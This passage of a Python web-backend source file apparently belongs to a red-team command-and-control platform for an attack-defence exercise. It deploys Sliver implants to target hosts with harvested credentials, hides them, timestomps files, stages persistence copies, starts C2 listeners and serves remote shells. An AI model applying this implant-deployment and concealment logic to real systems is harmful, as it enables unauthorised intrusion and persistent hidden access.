                    deployed_by=actor_username,
                    deploy_params=_pers_params or None,
                    computed_difficulty=body.computed_difficulty,
                )
                if deployed_ioc_id:
                    r["deployed_ioc_id"] = deployed_ioc_id

                if body.enable_hiding and deployed_ioc_id:
                    try:
                        from fastapi_backend.core.hide_config import (
                            insert_hiding_entries_for_deploy,  # cycle-break
                        )
                        from fastapi_backend.routes.ioc_deploy import (
                            _push_hiding_config_async,  # cycle-break
                        )
                        from iocs.persistence import (
                            get_by_name as _pm_lookup,  # cycle-break
                        )
                        _pm_for_hiding = _pm_lookup(body.persistence_name) if (
                            body.persistence_name and hook_result.get("persistence_applied")
                        ) else None
                        _hiding_added = insert_hiding_entries_for_deploy(
                            box_ip=ip,
                            box_os=box_os,
                            ioc_name=body.auto_register_ioc_name or "",
                            deployed_ioc_id=deployed_ioc_id,
                            process_name=r.get("filename") or None,
                            file_path=binary_remote or None,
                            persistence_pm=_pm_for_hiding,
                            deploy_params=_pers_params or {},
                        )
                        if _hiding_added:
                            _protocol_h = "smb" if is_win else "ssh"
                            with Session(engine) as _hdb:
                                _rh, _rp, _port = resolve_nxc_target(ip, _protocol_h, _hdb)
                            _cred_info_h = {
                                "username": uname,
                                "password": pwd,
                                "routed_host": _rh,
                                "routed_proto": _rp,
                                "port": _port,
                            }
                            await _push_hiding_config_async(ip, box_os, nxc, _cred_info_h, is_win)
                            r["hiding_entries_added"] = _hiding_added
                    except Exception as _hc_exc:
                        logger.warning("_bg_generate: hiding config push failed for %s: %s", ip, _hc_exc)

                # Stage backup copy if requested (PLAN_backup_copy_persistence.md).
                # Must run AFTER _auto_register_deployed_ioc so the DeployedIOCs row
                # (and its recorded BACKUP_DIR) already exists.
                _needs_backup = body.backup_copy_enabled
                if _needs_backup is None:
                    try:
                        _ioc_bc = get_orchestrator().ioc_loader.ioc_definitions.get(
                            body.auto_register_ioc_name
                        )
                        _needs_backup = bool(_ioc_bc and getattr(_ioc_bc, "backup_copy", False))
                    except Exception:
                        _needs_backup = False
                # Injection storage modes have no persistent file — skip backup.
                if body.storage_mode in ("self_inject", "self_inject_persist"):
                    _needs_backup = False

                if _needs_backup and binary_path and binary_path.exists():
                    _bc_path = await _stage_backup_for_deploy(
                        task_id=task_id, box_ip=ip, box_os=box_os, is_windows=is_win,
                        binary_path=binary_path, filename=r["filename"],
                        nxc=nxc, timestomp=body.timestomp,
                        deployed_ioc_id=deployed_ioc_id,
                        ioc_name=body.auto_register_ioc_name,
                    )
                    if _bc_path:
                        r["backup_copy_path"] = _bc_path

                # Storage mode dispatch (logged; actual storager is the deploy script
                # which reads C3R_SHELLCODE_B64 env injected by operator).
                if body.storage_mode != "file" and body.auto_register_ioc_name:
                    logger.info(
                        "_bg_generate task=%d: storage_mode=%s for %s on %s",
                        task_id, body.storage_mode, body.auto_register_ioc_name, ip,
                    )

            update_box_progress(
                task_id, ip, "done",
                exec_path=r.get("delivery_method") or "nxc",
                details=json.dumps({k: v for k, v in r.items() if k != "host"}),
            )

        successful_ips = [r["host"] for r in deploy_results if r["success"]]
        if successful_ips:
            def _update_last_implant(db: Session) -> None:
                for ip in successful_ips:
                    box = query_one(db, Boxes, box_ip=ip)
                    if box:
                        box.last_implant_id = implant_id
            try:
                await write_actor.submit(_update_last_implant, label="_bg_generate_last_implant")
            except Exception:
                logger.exception("_bg_generate: failed to update last_implant_id (non-fatal)")

        # Aggregate timestomp stats at task-level for plan §3.9 telemetry.
        per_box_stomp = {r["host"]: r["timestomp"] for r in deploy_results if r.get("timestomp")}
        if per_box_stomp:
            total_attempted = sum(s.get("attempted", 0) for s in per_box_stomp.values())
            total_succeeded = sum(s.get("succeeded", 0) for s in per_box_stomp.values())
            total_failed: list[dict[str, Any]] = []
            for s in per_box_stomp.values():
                total_failed.extend(s.get("failed", []))
            update_task_metadata(task_id, {"timestomp": {
                "enabled": True,
                "attempted": total_attempted,
                "succeeded": total_succeeded,
                "failed": total_failed,
                "per_box": per_box_stomp,
            }})

    # --- Persist build metadata ---
    last_deployed_ip = next((r["host"] for r in reversed(deploy_results) if r["success"]), None)
    last_deployed_path = next((r.get("path") for r in reversed(deploy_results) if r["success"]), None)
    def _persist_build(db: Session) -> None:
        if _existing:
            row = db.get(ImplantBuilds, _existing.id)
            if row:
                if last_deployed_ip:
                    row.last_deployed_to = last_deployed_ip
                if last_deployed_path:
                    row.last_deployed_path = last_deployed_path
                if row.c2_url == "unknown":
                    row.c2_url = body.c2_url
        else:
            build_row = ImplantBuilds(
                id=implant_id,
                os=body.os,
                implant_type=implant_type,
                arch=body.arch,
                format=body.format,
                c2_url=body.c2_url,
                filename=filename,
                # bare Sliver codename — matches implant_builds() for the gate.
                sliver_name=(Path(sliver_name).stem if sliver_name else None),
                created_at=dt.datetime.now(dt.UTC),
                last_deployed_to=last_deployed_ip,
                last_deployed_path=last_deployed_path,
                persistence_mechanism=body.persistence_name,
                immutable_scope=(body.immutable_scope if body.apply_immutable else "none"),
            )
            db.add(build_row)
    try:
        await write_actor.submit(_persist_build, label="_bg_generate_persist_build")
    except Exception:
        logger.exception("_bg_generate: failed to persist ImplantBuilds row (non-fatal, binary on disk at %s)", binary_path)

    any_failed = any(not r["success"] for r in deploy_results)
    finish_task(task_id, "failed" if (deploy_results and any_failed) else "done")


def _prune_stale_implant_builds(db: Session, store_dir: Path) -> None:
    """Remove DB rows whose build directory no longer exists on disk.

    Fragment: caller submits this via write_actor (or runs inside its own actor
    txn). Does NOT commit — the enclosing actor transaction does.
    """
    if not store_dir.exists():
        return
    builds = db.execute(select(ImplantBuilds)).scalars().all()
    for b in builds:
        if not (store_dir / b.id).is_dir():
            db.delete(b)


@router.get("/implants/builds")
async def list_implant_builds(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """List all generated implant builds, syncing against disk first.

    On each call:
    - Registers any build directories present on disk but missing from the DB.
    - Removes DB rows whose build directory no longer exists on disk.
    - Annotates each row with ``sliver_valid``: whether its sig-key is still known
      to the live Sliver server. A build whose ``implant_config`` was pruned from
      ``sliver.db`` is dead-on-arrival (deploy would flood "unknown implant
      signature key"), so build-pickers (UI "use existing" flow, the live test
      helper) must not reuse it. Fail-open (``True``) when Sliver can't be queried.
    """
    def _collect() -> list[dict[str, Any]]:
        from fastapi_backend.c2.implant_migration import (
            migrate_implant_builds,  # cycle-break
        )

        # Register any new on-disk builds not yet in the DB
        migrate_implant_builds()

        # Prune DB rows whose directories have been deleted (via the single-writer actor)
        store_dir = Path(config.IMPLANT_STORE_DIR)
        write_actor.submit_sync(lambda db: _prune_stale_implant_builds(db, store_dir),
                                label="list_implant_builds_prune")
        with Session(engine) as db:
            # Re-fetch after pruning
            rows = db.execute(
                select(ImplantBuilds).order_by(ImplantBuilds.created_at.desc())
            ).scalars().all()
            return [
                {
                    "id": b.id,
                    "os": b.os,
                    "implant_type": b.implant_type,
                    "arch": b.arch,
                    "format": b.format,
                    "c2_url": b.c2_url,
                    "filename": b.filename,
                    "sliver_name": b.sliver_name,
                    "created_at": b.created_at.isoformat(),
                    "last_deployed_to": b.last_deployed_to,
                    "last_deployed_path": b.last_deployed_path,
                    "pivot_gateway": b.pivot_gateway,
                    "pivot_set_id": b.pivot_set_id,
                    "tcp_pivot_port": b.tcp_pivot_port,
                    "immutable_scope": b.immutable_scope,
                }
                for b in rows
            ]

    # The DB portion blocks (migrate + actor-prune + query) — keep it off the event
    # loop; then await the async Sliver-names oracle.
    builds = await asyncio.to_thread(_collect)
    known = await _sliver_known_build_names()
    for b in builds:
        # None => oracle unavailable (Sliver down / DEV_MODE): fail-open so a
        # transient outage doesn't hide every build from the UI/test picker.
        # Key on the bare Sliver codename, not the composite filename stem (which
        # never matches). Fail-open (valid) when the codename is unknown (disk-synced
        # row) or the list can't be fetched — never hide a build on a false positive.
        b["sliver_valid"] = (
            known is None or not b["sliver_name"] or b["sliver_name"] in known
        )
    return {"builds": builds}


@router.get("/implants/builds/{build_id}")
def download_implant_build(build_id: str, current_user: Users = Depends(require_non_blue)) -> StreamingResponse:
    """Stream the binary for a stored implant build to the operator."""
    store = Path(config.IMPLANT_STORE_DIR) / build_id
    if not store.exists():
        raise HTTPException(status_code=404, detail="Build not found")
    files = list(store.iterdir())
    if not files:
        raise HTTPException(status_code=404, detail="Build has no files")
    f = files[0]
    return StreamingResponse(
        iter([f.read_bytes()]),
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{f.name}"'},
    )


# ---------------------------------------------------------------------------
# Listener management (Sliver jobs)
# ---------------------------------------------------------------------------

@router.get("/listeners")
async def list_listeners(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """List active Sliver C2 listener jobs."""
    if config.DEV_MODE:
        return {"listeners": []}
    client = _get_sliver_client()
    jobs = await client.jobs()
    return {
        "listeners": [
            {"id": j.ID, "name": j.Name, "protocol": j.Protocol, "port": j.Port}
            for j in jobs
        ]
    }


class StartMtlsRequest(BaseModel):
    """POST /c2/listeners/mtls request body."""

    host: str = "0.0.0.0"
    port: int = 8888
    persistent: bool = False


@router.post("/listeners/mtls")
async def start_mtls_listener(
    body: StartMtlsRequest,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Start a Sliver mTLS C2 listener on the given host:port.

    Idempotent: if a listener is already running on the same port, returns it
    immediately without attempting to start a duplicate.
    """
    if config.DEV_MODE:
        raise HTTPException(status_code=503, detail="[DEV] Listeners require a live Sliver connection")
    client = _get_sliver_client()

    # Check for an existing listener on this port before starting a new one.
    try:
        jobs = await client.jobs()
        for j in jobs:
            if j.Port == body.port:
                return {"id": j.ID, "host": body.host, "port": j.Port, "existing": True}
    except Exception:
        pass  # If jobs() fails, still attempt to start the listener below.

    try:
        result = await client.start_mtls_listener(
            host=body.host, port=body.port, persistent=body.persistent
        )
        return {"id": result.JobID, "host": body.host, "port": body.port, "existing": False}
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Failed to start mTLS listener: {exc}") from exc


# ---------------------------------------------------------------------------
# Implant deploy (redeploy existing build to one or more targets)
# ---------------------------------------------------------------------------

class ImplantDeployRequest(BaseModel):
    """POST /c2/implants/{build_id}/deploy request body."""

    target_ips: list[str]
    cred_id: int | None = None
    username: str | None = None
    password: str | None = None


@router.post("/implants/{build_id}/deploy", status_code=202)
async def deploy_implant(
    build_id: str,
    body: ImplantDeployRequest,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Upload and execute a stored implant on one or more target hosts via NXC.

    Returns ``202 {task_id}`` immediately; the NXC put_file + execute fanout runs in
    the background via :func:`_bg_deploy_implant`. Poll ``GET /c2/tasks/{task_id}`` for
    per-host progress (``progress_json[ip]``) and the aggregate ``metadata_json.results``.

    Blocking here is what produced the ``httpx.ReadTimeout`` failure class: the deploy
    queues behind per-box NXC semaphores, so under a wide xdist run the caller's read
    timeout expired while the deploy was still legitimately in flight
    (``docs/PLAN_async_implant_deploy.md``).

    Cheap validation (unknown build, missing binary, bad cred) stays synchronous so
    callers still get 404/422 directly rather than having to poll for it.
    """
    if config.DEV_MODE:
        return {"results": [], "message": "[DEV] implant deploy stubbed"}

    # Resolve build record and credential info in one DB session
    with Session(engine) as db:
        build = db.get(ImplantBuilds, build_id)
        if not build:
            raise HTTPException(status_code=404, detail="Build not found")
        fname = build.filename   # capture before session closes
        build_os = build.os or "linux"  # capture before session closes
        build_sliver_name = build.sliver_name  # bare Sliver codename (may be None)

        implant_path = Path(config.IMPLANT_STORE_DIR) / build_id / fname
        if not implant_path.exists():
            raise HTTPException(status_code=404, detail="Build file not found on disk")

    # Sliver-validity gate: a build whose sig-key was pruned from sliver.db
    # (clean_stale_implants / a Sliver restart) is dead-on-arrival — the server
    # rejects every callback with "unknown implant signature key" (290k-event log
    # floods observed). Reject here so no caller (UI, deploy_all, live tests) can
    # stage a DOA binary; the caller regenerates a fresh build.
    # Key on the bare Sliver codename (build_sliver_name) — the only identifier in
    # Sliver's implant_builds() list; the composite/masquerade filename stem never
    # matches, so keying on it false-flagged EVERY build as stale. Fail-open when the
    # codename is unknown (disk-synced row) or the list can't be fetched (Sliver down
    # / DEV_MODE) so a valid build is never rejected. Done outside the DB session.
    _known = await _sliver_known_build_names()
    if _known is not None and build_sliver_name and build_sliver_name not in _known:
        raise HTTPException(
            status_code=409,
            detail={
                "code": "stale_sliver_config",
                "detail": (
                    f"Build {build_id} (sliver={build_sliver_name}, file={fname}) is absent "
                    "from Sliver's live build list — its implant_config was pruned. "
                    "Regenerate a fresh build."
                ),
                "build_id": build_id,
            },
        )

    with Session(engine) as db:
        deploy_tasks: list[tuple[str, str, str, bool]] = []
        no_cred_results: list[dict] = []
        task_team_num: int | None = None
        for ip in body.target_ips:
            box = query_one(db, Boxes, box_ip=ip)
            box_os = (box.os or "") if box else ""
            if task_team_num is None and box is not None:
                task_team_num = box.team_num
            is_win = "windows" in (box_os or build_os or "").lower()
            uname, pwd = body.username, body.password
            if not uname:
                if body.cred_id is not None:
                    cred = db.get(Credentials, body.cred_id)
                    if not cred:
                        raise cred_not_found()
                    if cred.is_infrastructure:
                        raise HTTPException(
                            status_code=422,
                            detail="scoring-infrastructure credential cannot be used by operators",
                        )
                else:
                    cred = _get_best_cred(ip, db, protocol="smb" if is_win else "ssh")
                if not cred:
                    no_cred_results.append({"host": ip, "success": False, "error": "No credentials"})
                    continue
                uname, pwd = cred.username, cred.password
            deploy_tasks.append((ip, uname, pwd, is_win))

    task_id = create_task(
        "implant_deploy",
        current_user.username,
        task_team_num,
        list(body.target_ips),
        metadata={"build_id": build_id, "implant_name": fname},
    )
    fire_and_forget(
        _bg_deploy_implant(
            task_id, build_id, fname, build_os, implant_path, deploy_tasks, no_cred_results
        )
    )
    return {"task_id": task_id}


async def _bg_deploy_implant(
    task_id: int,
    build_id: str,
    fname: str,
    build_os: str,
    implant_path: Path,
    deploy_tasks: list[tuple[str, str, str, bool]],
    no_cred_results: list[dict],
) -> None:
    """Background half of :func:`deploy_implant` — NXC fanout + DB bookkeeping.

    Mirrors :func:`_bg_generate`'s lifecycle: ``start_task`` → work → per-host
    ``update_box_progress`` → ``update_task_metadata`` → ``finish_task``. Any escaping
    exception still terminates the task as ``failed`` so a poller never blocks forever on
    a task that is never going to finish.
    """
    start_task(task_id)
    wrapper = _get_nxc_wrapper()

    # Hosts with no usable credential never reach the NXC fanout — record them up front
    # so a poller sees the full target set in progress_json, not a partial one.
    for r in no_cred_results:
        update_box_progress(task_id, r["host"], "failed", error=r.get("error"))

    try:
        set_phase(task_id, "deploying")
        # Run deploys concurrently
        gathered = await asyncio.gather(*[
            _deploy_one_implant(wrapper, implant_path, fname, ip, uname, pwd, is_win, goos=build_os)
            for ip, uname, pwd, is_win in deploy_tasks
        ])

        # Report the first pass before the retry pass so a poller sees liveness rather
        # than silence for the whole (gather + 3s backoff + retry gather) window.
        for (ip, _u, _p, _w), r in zip(deploy_tasks, gathered, strict=False):
            update_box_progress(
                task_id, ip,
                "done" if r.get("success") else "failed",
                error=None if r.get("success") else r.get("error"),
                # details is a STRING on OperatorTask.progress_json (task_tracker
                # truncates it with a slice) — serialize, don't hand it a dict.
                details=json.dumps({"path": r.get("path")}) if r.get("success") else None,
            )

        # Single-pass retry for hosts that failed on cold start. Soak finding
        # 2026-05-10: first multi-implant deploy after backend boot often returns
        # 0/N succeeded for the 2nd-4th implants even though the 1st works 20/20.
        # Suspected cause: NXC subprocess / SMB connection cache cold-state.
        # Subsequent deploys (warm state) succeed cleanly. A single retry pass
        # with a short backoff converts most cold-start failures into successes
        # without masking persistent failures (which fail on both passes).
        failed_now = [(t, i) for i, (t, r) in enumerate(zip(deploy_tasks, gathered, strict=False)) if not r.get("success")]
        if failed_now and len(failed_now) >= max(3, len(deploy_tasks) // 2):
            logger.info(
                "deploy_implant task=%d: %d/%d hosts failed on cold pass — retrying once after 3s backoff",
                task_id, len(failed_now), len(deploy_tasks),
            )
            await asyncio.sleep(3)
            retry_results = await asyncio.gather(*[
                _deploy_one_implant(wrapper, implant_path, fname, ip, uname, pwd, is_win, goos=build_os)
                for (ip, uname, pwd, is_win), _ in failed_now
            ])
            # Overlay retry results where they succeeded; keep original failure detail otherwise
            gathered = list(gathered)
            for ((ip, _u, _p, _w), idx), retry_r in zip(failed_now, retry_results, strict=False):
                if retry_r.get("success"):
                    gathered[idx] = retry_r
                    update_box_progress(
                        task_id, ip, "done",
                        details=json.dumps({"path": retry_r.get("path"), "retried": True}),
                    )

        results = no_cred_results + list(gathered)

        # Update DB for successful deploys
        successful_ips = [r["host"] for r in results if r["success"]]
        if successful_ips:
            last_path = next((r.get("path") for r in reversed(results) if r["success"]), None)
            def _persist_deploy(db: Session) -> None:
                build = db.get(ImplantBuilds, build_id)
                if build:
                    build.last_deployed_to = successful_ips[-1]
                    build.last_deployed_path = last_path
                for ip in successful_ips:
                    box = query_one(db, Boxes, box_ip=ip)
                    if box:
                        box.last_implant_id = build_id
            await write_actor.submit(_persist_deploy, label="_bg_deploy_implant_persist")

        set_phase(task_id, None)
        update_task_metadata(task_id, {"results": results})
        # A deploy that landed on no host at all is a failed task, not a done one with
        # sad contents — callers gate on task status, so it must reflect reality.
        finish_task(task_id, "done" if successful_ips else "failed")
    except Exception as exc:
        logger.error("_bg_deploy_implant task=%d: unexpected error: %s", task_id, exc, exc_info=True)
        update_task_metadata(task_id, {"error": str(exc)})
        finish_task(task_id, "failed")


# ---------------------------------------------------------------------------
# Situational Awareness (SA) endpoints
# ---------------------------------------------------------------------------

@router.get("/sa")
def get_sa_overview(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Latest SAResult per box per category — for the overview."""
    with Session(engine) as db:
        sub = db.execute(
            select(SAResult.box_ip, SAResult.category, func.max(SAResult.id).label("max_id"))
            .group_by(SAResult.box_ip, SAResult.category)
        ).all()
        max_ids = [row.max_id for row in sub]
        if not max_ids:
            return {"sa": {}}
        rows = db.execute(select(SAResult).where(SAResult.id.in_(max_ids))).scalars().all()
        result: dict = {}
        for r in rows:
            result.setdefault(r.box_ip, {})[r.category] = {
                "id": r.id,
                "collected_at": r.collected_at.isoformat(),
                "data": json.loads(r.data),
            }
        return {"sa": result}


# Per-box in-flight SA tracker.  Concurrent operators clicking "Run SA Now"
# on the same box would otherwise fire parallel NXC subprocesses, doubling
# RAM + writing duplicate rows.  Coalesce all callers onto one Future.
_sa_in_flight: dict[str, asyncio.Future] = {}


async def _do_sa_collection(box_ip: str) -> dict[str, Any]:
    """The actual SA collection logic — extracted so the in-flight coalescer can wrap it.

    Returns the same shape as the route response.
    """
    import json as _json  # cycle-break
    from datetime import UTC, datetime  # cycle-break

    from fastapi_backend.c2.sa_collector import (  # cycle-break
        _CredBoundWrapper,
        run_collectors_for_box,
    )
    from fastapi_backend.database.db_writer_process import (
        SAResultMessage,  # cycle-break
    )
    from fastapi_backend.utils.dependencies import (  # cycle-break
        get_nxc_wrapper,
        get_orchestrator,
    )

    nxc = get_nxc_wrapper()
    orchestrator = get_orchestrator()

    with Session(engine) as db:
        box = query_one(db, Boxes, box_ip=box_ip)
        if not box:
            raise box_not_found(box_ip)
        from sqlalchemy import nullslast  # cycle-break

        from fastapi_backend.database.models import Credentials  # cycle-break
        cred = db.execute(
            select(Credentials)
            .where(Credentials.box_ip == box_ip, Credentials.valid.is_not(False))
            .order_by(nullslast(Credentials.valid.desc()), Credentials.is_default.desc())
            .limit(1)
        ).scalar_one_or_none()
        if not cred:
            raise no_creds_for_box(box_ip, valid_only=True)
        box_os = box.os or ""

    wrapper = _CredBoundWrapper(nxc, cred)
    collected = await run_collectors_for_box(box_ip, box_os, wrapper)
    if not collected:
        raise HTTPException(status_code=500, detail="SA collection returned no data")

    db_writer_manager = orchestrator.executor.db_writer_manager
    for category, data_dict in collected.items():
        db_writer_manager.put_sa_result(SAResultMessage(
            box_ip=box_ip,
            category=category,
            collected_at=datetime.now(UTC),
            data=_json.dumps(data_dict),
            retention_count=config.SA_RESULT_RETENTION_COUNT,
        ))

    return {"status": "ok", "categories": list(collected.keys())}


@router.post("/sa/{box_ip:path}/collect")
async def trigger_sa_for_box(box_ip: str, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Manually trigger an SA collection run for a single box.

    Coalesces concurrent triggers per `box_ip` so two operators clicking
    "Run SA Now" on the same box at the same time do **not** spawn two
    parallel NXC subprocesses — the second caller awaits the first's
    result.  Both callers receive the same response (or the same exception
    if the underlying collection fails).
    """
    if config.DEV_MODE:
        return {"status": "ok", "message": "[DEV] SA collection stubbed — data already seeded"}

    # Coalesce: if a collection is already running for this box, await it.
    existing = _sa_in_flight.get(box_ip)
    if existing is not None:
        return await existing

    fut: asyncio.Future = asyncio.get_running_loop().create_future()
    _sa_in_flight[box_ip] = fut
    try:
        result = await _do_sa_collection(box_ip)
        fut.set_result(result)
        return result
    except BaseException as e:
        fut.set_exception(e)
        raise
    finally:
        _sa_in_flight.pop(box_ip, None)


@router.get("/sa/{box_ip:path}/history")
def get_sa_history_for_box(
    box_ip: str,
    limit: int = Query(default=2, ge=1, le=config.SA_RESULT_RETENTION_COUNT),
    current_user: Users = Depends(require_non_blue),
) -> dict[str, list[dict[str, Any]]]:
    """Most recent SAResult rows per category for a box, newest-first.

    Returns ``{category: [{id, collected_at, data}, ...]}`` with up to
    ``limit`` entries per category (categories with fewer results return a
    shorter list — no padding).  Used by the BoxSAPanel change-detection
    diff (``limit=2``) to compare the latest collection against the prior one.
    """
    with Session(engine) as db:
        categories = db.execute(
            select(SAResult.category)
            .where(SAResult.box_ip == box_ip)
            .group_by(SAResult.category)
        ).scalars().all()

        out: dict[str, list[dict[str, Any]]] = {}
        for cat in categories:
            rows = db.execute(
                select(SAResult)
                .where(SAResult.box_ip == box_ip, SAResult.category == cat)
                .order_by(SAResult.id.desc())
                .limit(limit)
            ).scalars().all()
            out[cat] = [
                {
                    "id": r.id,
                    "collected_at": r.collected_at.isoformat(),
                    "data": json.loads(r.data),
                }
                for r in rows
            ]
        return out


@router.get("/sa/{box_ip:path}")
def get_sa_for_box(box_ip: str, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Latest SAResult for each category for a specific box."""
    with Session(engine) as db:
        sub = db.execute(
            select(SAResult.category, func.max(SAResult.id).label("max_id"))
            .where(SAResult.box_ip == box_ip)
            .group_by(SAResult.category)
        ).all()
        max_ids = [row.max_id for row in sub]
        if not max_ids:
            return {}
        rows = db.execute(select(SAResult).where(SAResult.id.in_(max_ids))).scalars().all()
        return {
            r.category: {
                "id": r.id,
                "collected_at": r.collected_at.isoformat(),
                "data": json.loads(r.data),
            }
            for r in rows
        }


# ---------------------------------------------------------------------------
# WebSocket shell
# ---------------------------------------------------------------------------

@router.websocket("/sessions/{session_id}/shell")
async def session_shell(websocket: WebSocket, session_id: str) -> None:
    """Interactive PTY shell via WebSocket, backed by a Sliver session tunnel.

    Token is passed as a query param: ws://.../shell?token=<jwt>

    Uses PtyHub (docs/PLAN_pty_session_shell.md): one Sliver Shell(EnablePTY)
    tunnel per session, fanned out to many WebSocket clients. Stdin is streamed
    as raw bytes over binary WS frames; stdout streams back the same way. cd,
    env vars, shell functions, and interactive TUIs all persist because the
    target shell child is spawned once and stays alive for the tunnel's
    lifetime. Late-joining clients receive a raw-byte history replay
    terminated by a ``{"type":"replay_end"}`` control frame.

    Only real Sliver sessions reach this endpoint — beacons cannot hold tunnels
    and do not surface an OS-shell modal in the UI.
    """
    token = websocket.query_params.get("token")
    try:
        user = get_user_from_token(token) if token else None
    except Exception:
        user = None

    if not user or user.is_blue_team:
        _log_ws_close("shell", session_id, 4003, "auth/blue-team rejected")
        await websocket.close(code=4003)
        return

    if config.DEV_MODE:
        await websocket.accept()
        await websocket.send_text("\r\n[DEV MODE] Shell not available — no Sliver connection\r\n")
        _log_ws_close("shell", session_id, None, "dev-mode stub")
        await websocket.close()
        return

    await websocket.accept()
    _log_ws_open("shell", session_id, user)

    from fastapi_backend.c2.pty_hub import PtyHub  # cycle-break
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break

    client = sliver_manager.get_client()
    if not client:
        with contextlib.suppress(Exception):
            await websocket.send_json({"type": "session_dead", "error": "Sliver not connected"})
        _log_ws_close("shell", session_id, None, "sliver not connected")
        await websocket.close()
        return

    interact = await client.interact_session(session_id)
    if not interact:
        with contextlib.suppress(Exception):
            await websocket.send_json({"type": "session_dead", "error": "Session not found"})
        _log_ws_close("shell", session_id, None, "session not found")
        await websocket.close()
        return

    hubs: dict = websocket.app.state.session_hubs
    hub = hubs.get(session_id)
    if hub is None:
        hub = PtyHub(session_id=session_id, interact=interact, client=client)
        hubs[session_id] = hub
        await hub.start()

    # Terminal-presence registry (docs/PLAN_targets_terminal_presence.md).
    from fastapi_backend.c2.terminal_presence import get_tracker  # cycle-break
    presence_box_ip = _resolve_box_ip_for_session(session_id, interact)
    presence_entry = get_tracker().register(
        box_ip=presence_box_ip,
        operator=user.username,
        session_type="os_shell",
        session_id=session_id,
    )
    await _broadcast_terminal_presence(presence_box_ip)

    await hub.add_client(websocket)

    close_code: object = None
    try:
        close_code = await _run_shell_until_dead_or_disconnect(
            websocket, hub, _pty_recv(websocket, hub),
        )
    finally:
        get_tracker().release(presence_box_ip, presence_entry.connection_id)
        fire_and_forget(_broadcast_terminal_presence(presence_box_ip))
        _log_ws_close("shell", session_id, close_code)
        hub.remove_client(websocket)
        if hub.client_count() > 0:
            fire_and_forget(hub._broadcast_count())
        # No last-client-cancel here: PtyHub's reader/keepalive intentionally
        # stay alive so the shell child + tunnel survive brief operator drops
        # (reconnect within IDLE_TIMEOUT_SECONDS resumes the SAME shell). The
        # loop_hub_cleanup task tears it down after the idle timer expires.


# ---------------------------------------------------------------------------
# Sliver shell — structured command dispatch over WebSocket
# ---------------------------------------------------------------------------

@router.websocket("/sessions/{session_id}/sliver-shell")
async def sliver_shell(websocket: WebSocket, session_id: str) -> None:
    """Sliver-native command shell: maps typed commands to Sliver RPCs.

    Token is passed as a query param: ws://.../sliver-shell?token=<jwt>

    Unlike the OS shell, this does not spawn a remote process — each command
    calls a Sliver protobuf RPC directly (ps, ls, pwd, execute, …).
    """
    token = websocket.query_params.get("token")
    try:
        user = get_user_from_token(token) if token else None
    except Exception:
        user = None

    if not user or user.is_blue_team:
        _log_ws_close("sliver-shell", session_id, 4003, "auth/blue-team rejected")
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _log_ws_open("sliver-shell", session_id, user)

    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break
    client = None if config.DEV_MODE else sliver_manager.get_client()
    if client is None:
        stub_prefix = "[DEV MODE]" if config.DEV_MODE else "[STUB]"
        await websocket.send_text(
            f"\r\n{stub_prefix} Sliver not connected — running in stub mode.\r\n"
            "Type 'exit' to close.\r\n> "
        )
        try:
            while True:
                msg = await websocket.receive_json()
                if isinstance(msg, dict) and msg.get("type") == "input":
                    line = msg.get("data", "").strip()
                    if line.lower() in ("exit", "quit"):
                        break
                    await websocket.send_text(f"{stub_prefix} {line!r} — commands not executed\r\n> ")
        except WebSocketDisconnect:
            pass
        finally:
            await websocket.close()
        return

    try:
        interact = await client.interact_session(session_id)
    except Exception as exc:
        await websocket.send_text(f"[error] interact_session failed: {exc}\r\n")
        await websocket.close()
        return

    if not interact:
        await websocket.send_text(f"[error] Session {session_id} not found\r\n")
        await websocket.close()
        return

    from fastapi_backend.c2.sliver_hub import SliverHub  # cycle-break

    hubs: dict = websocket.app.state.sliver_hubs
    hub = hubs.get(session_id)
    if hub is None:
        # Build banner and seed it as the first history entry so late joiners see it.
        try:
            os_str = str(interact.os) if interact.os else "unknown"
            host_str = str(interact.hostname) if interact.hostname else "unknown"
            user_str = str(interact.username) if interact.username else "unknown"
            banner = (
                f"\r\n[sliver-shell] Connected to session {session_id}\r\n"
                f"  OS: {os_str}  Hostname: {host_str}  User: {user_str}\r\n"
                "Type 'help' for available commands, 'exit' to disconnect.\r\n"
                "> "
            )
        except Exception:
            banner = f"\r\n[sliver-shell] Connected to session {session_id}\r\n> "
        hub = SliverHub(session_id=session_id, interact=interact)
        hub._history.append(banner)
        hubs[session_id] = hub

    # Terminal-presence registry (docs/PLAN_targets_terminal_presence.md).
    from fastapi_backend.c2.terminal_presence import get_tracker  # cycle-break
    presence_box_ip = _resolve_box_ip_for_session(session_id, interact)
    presence_entry = get_tracker().register(
        box_ip=presence_box_ip,
        operator=user.username,
        session_type="sliver_shell",
        session_id=session_id,
    )
    await _broadcast_terminal_presence(presence_box_ip)

    await hub.add_client(websocket)
    hub.ensure_execute_loop()

    close_code: object = None
    try:
        close_code = await _run_shell_until_dead_or_disconnect(
            websocket, hub, _sliver_shell_recv(websocket, hub),
        )
    finally:
        get_tracker().release(presence_box_ip, presence_entry.connection_id)
        fire_and_forget(_broadcast_terminal_presence(presence_box_ip))
        _log_ws_close("sliver-shell", session_id, close_code)
        hub.remove_client(websocket)
        if hub.client_count() > 0:
            fire_and_forget(hub._broadcast_count())
        else:
            if hub._execute_task and not hub._execute_task.done():
                hub._execute_task.cancel()
        # _run_shell_...() already closes with 4010 on a dead session; for a
        # normal client disconnect the socket is closed here.
        if close_code != WS_CLOSE_SESSION_DEAD:
            with contextlib.suppress(Exception):
                await websocket.close()


# ---------------------------------------------------------------------------
# Sliver console — full sliver-client PTY session over WebSocket
# ---------------------------------------------------------------------------

@router.websocket("/sliver-console")
async def sliver_console_ws(websocket: WebSocket) -> None:
    """Full sliver-client console via isolated PTY subprocess.

    Token passed as query param: ws://.../sliver-console?token=<jwt>
    Each connection spawns its own sliver-client process — no shared state.
    """
    from fastapi_backend.c2.sliver_console import handle_sliver_console  # lazy-load
    await handle_sliver_console(websocket)
